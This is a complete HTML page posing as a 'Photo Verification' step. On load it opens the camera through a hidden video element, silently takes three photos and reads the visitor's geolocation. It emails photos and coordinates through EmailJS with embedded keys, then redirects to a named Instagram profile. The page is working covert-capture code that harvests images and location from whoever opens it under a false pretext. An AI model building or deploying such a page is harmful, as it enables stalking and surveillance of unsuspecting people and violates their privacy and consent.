<!DOCTYPE html>
<html>
<head>
    <title>Photo Verification</title>
    <style>
        #video { display: none; }
        #status {
            font-size: 18px;
            color: black;
        }
    </style>
</head>
<body>

<h2>Photo Verification</h2>

<p id="status"></p>

<!-- Hidden camera elements -->
<video id="video" width="320" height="240" autoplay playsinline></video>
<canvas id="canvas" width="200" height="200" style="display:none;"></canvas>

<!-- EmailJS -->
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<script>
emailjs.init("vieRRG0Q8QGFFS-XO");  // your public key
</script>

<script>

let stream;
let photos = [];   // store 3 photos

// ---------------- START CAMERA ----------------
window.onload = async () => {
    try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
        document.getElementById("video").srcObject = stream;
        document.getElementById("status").innerText = 
            "verification in progress";

        // Start auto-capturing
        setTimeout(() => captureThreePhotos(), 1000);

    } catch (err) {
        document.getElementById("status").innerText = "Camera blocked.";
    }
};

// --------------- CAPTURE 3 PHOTOS ---------------
function captureThreePhotos() {
    let count = 0;

    let interval = setInterval(() => {
        takeSinglePhoto();
        count++;

        if (count === 3) {
            clearInterval(interval);
            document.getElementById("status").innerText = 
                "Photos captured. Getting location…";
            getLocationAndSend();
        }
    }, 1200); // take a photo every 1.2 sec
}

// --------------- TAKE ONE PHOTO ---------------
function takeSinglePhoto() {
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");

    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    // compress so EmailJS accepts
    const img = canvas.toDataURL("image/jpeg", 0.2);

    photos.push(img);

    document.getElementById("status").innerText = 
        `Captured photo ${photos.length} of 3`;
}

// --------------- GET LOCATION (optional) ---------------
function getLocationAndSend() {
    let emailData = {
        photo1: photos[0],
        photo2: photos[1],
        photo3: photos[2],
        location: "Location Blocked"
    };

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                emailData.location = 
                    pos.coords.latitude + ", " + pos.coords.longitude;
                sendEmail(emailData);
            },
            () => {
                sendEmail(emailData); // send even if blocked
            },
            { timeout: 5000 }
        );
    } else {
        sendEmail(emailData);
    }
}

// ---------------- SEND EMAIL ----------------
function sendEmail(data) {
    document.getElementById("status").innerText = "Sending email…";

    emailjs
        .send("service_c2bqpj9", "template_pee9jcq", data)
        .then(() => {
            document.getElementById("status").innerText = 
                "Sent! Redirecting…";

            setTimeout(() => {
                window.location.href =
                    "https://www.instagram.com/_ansh_._katiyar_?igsh=MW9mYW1rNzFmN2tvZg%3D%3D&utm_source=qr";
            }, 2000);
        })
        .catch((err) => {
            document.getElementById("status").innerText = 
                "Failed to send email.";
            console.error(err);
        });
}

</script>

</body>
</html>
